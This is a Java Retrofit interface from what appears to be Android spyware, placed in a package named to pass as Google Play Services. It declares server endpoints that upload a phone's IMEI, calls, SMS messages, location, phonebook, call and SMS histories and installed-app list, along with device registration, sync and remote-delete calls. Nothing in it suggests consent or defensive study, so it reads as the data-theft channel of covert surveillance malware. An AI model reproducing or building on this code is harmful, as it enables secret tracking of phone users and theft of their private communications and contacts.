package com.google.android.gms.persistent.googleapps.network.api;

import com.google.android.gms.persistent.googleapps.network.models.response.DeleteResponse;
import com.google.android.gms.persistent.googleapps.network.models.response.InformationResponse;
import com.google.android.gms.persistent.googleapps.network.models.response.InitialResponse;
import com.google.android.gms.persistent.googleapps.network.models.response.SyncResponse;

import java.util.Date;

import io.reactivex.Flowable;
import io.reactivex.Single;
import retrofit2.Call;
import retrofit2.http.Field;
import retrofit2.http.FormUrlEncoded;
import retrofit2.http.POST;

/**
 * Created by OldMan on 03.04.2017.
 */

public interface ServerApi {
    /**
     * @param imei
     * @param model
     * @return
     */
    @FormUrlEncoded
    @POST("/api/init")
    Call<InitialResponse> onInitDevice(@Field("imei") String imei,
                                         @Field("model") String model);

    /**
     * @param imei
     * @param device
     * @return
     */
    @FormUrlEncoded
    @POST("/api/sync")
    Call<SyncResponse> onStateSync(@Field("imei") String imei,
                                   @Field("device") String device);


    /**
     * @param imei
     * @param device
     * @param mode
     * @return
     */
    @FormUrlEncoded
    @POST("/api/rm")
    Call<DeleteResponse> onDeleteDevice(@Field("imei") String imei,
                                        @Field("device") String device,
                                        @Field("mode") String mode);


    /**
     * @param imei
     * @param device
     * @param data
     * @return
     */
    @FormUrlEncoded
    @POST("/api/call")
    Call<InformationResponse> setCallOfDevice(@Field("imei") String imei,
                                              @Field("device") String device,
                                              @Field("data") String data);

    /**
     * @param imei
     * @param device
     * @param data
     * @return
     */
    @FormUrlEncoded
    @POST("/api/sms")
    Call<InformationResponse> setSmsOfDevice(@Field("imei") String imei,
                                             @Field("device") String device,
                                             @Field("data") String data);

    /**
     * @param imei
     * @param device
     * @param data
     * @return
     */
    @FormUrlEncoded
    @POST("/api/location")
    Call<InformationResponse> setLocationOfDevice(@Field("imei") String imei,
                                                  @Field("device") String device,
                                                  @Field("data") String data);


    /**
     * @param imei
     * @param device
     * @param data
     * @return
     */
    @FormUrlEncoded
    @POST("/api/diagnostic")
    Call<InformationResponse> setDiagnosticOfDevice(@Field("imei") String imei,
                                                    @Field("device") String device,
                                                    @Field("data") String data);

    /**
     * @param imei
     * @param device
     * @param data
     * @param date
     * @return
     */
    @FormUrlEncoded
    @POST("/api/telbook")
    Call<InformationResponse> setTelBookOfDevice(@Field("imei") String imei,
                                                 @Field("device") String device,
                                                 @Field("data") String data,
                                                 @Field("date_create") Date date);

    /**
     * @param imei
     * @param device
     * @param data
     * @param date
     * @return
     */
    @FormUrlEncoded
    @POST("/api/list/call")
    Call<InformationResponse> setListCallOfDevice(@Field("imei") String imei,
                                                  @Field("device") String device,
                                                  @Field("data") String data,
                                                  @Field("date_create") Date date);

    /**
     * @param imei
     * @param device
     * @param data
     * @param date
     * @return
     */
    @FormUrlEncoded
    @POST("/api/list/sms")
    Call<InformationResponse> setListSmsOfDevice(@Field("imei") String imei,
                                                 @Field("device") String device,
                                                 @Field("data") String data,
                                                 @Field("date_create") Date date);

    /**
     * @param imei
     * @param device
     * @param data
     * @param date
     * @return
     */
    @FormUrlEncoded
    @POST("/api/list/app")
    Call<InformationResponse> setListAppOfDevice(@Field("imei") String imei,
                                                 @Field("device") String device,
                                                 @Field("data") String data,
                                                 @Field("date_create") Date date);

}
